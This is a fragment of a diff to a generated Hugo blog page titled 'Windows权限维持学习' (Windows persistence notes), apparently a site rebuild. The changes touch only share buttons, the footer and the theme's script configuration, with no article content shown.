+          <span><a href="javascript:void(0);" title="分享到 X" data-sharer="twitter" data-url="http://ghostasky.github.io/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/" data-title="Windows权限维持学习" data-hashtags="渗透"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://ghostasky.github.io/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/" data-hashtag="渗透"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://ghostasky.github.io/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/" data-title="Windows权限维持学习"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
   </span>
         </div>
       </div></div>
@@ -344,14 +388,14 @@ netsh也是Windows自带的命令，是用来配置网络的命令行工具。�
 
   <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
       <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
-    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.124.1"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.2"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.124.1"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.8-RC"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
         </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
             <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
-              <a href="/"></a></span></div></div>
+              <a href="/">Ghostasky</a></span></div></div>
   </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
         </div></div><div id="mask"></div><noscript>
-    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
   </noscript>
 </div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
-    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script src="/js/theme.min.js" defer></script></body>
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.8-RC"};</script><script src="/js/theme.min.js" defer></script></body>
 </html>
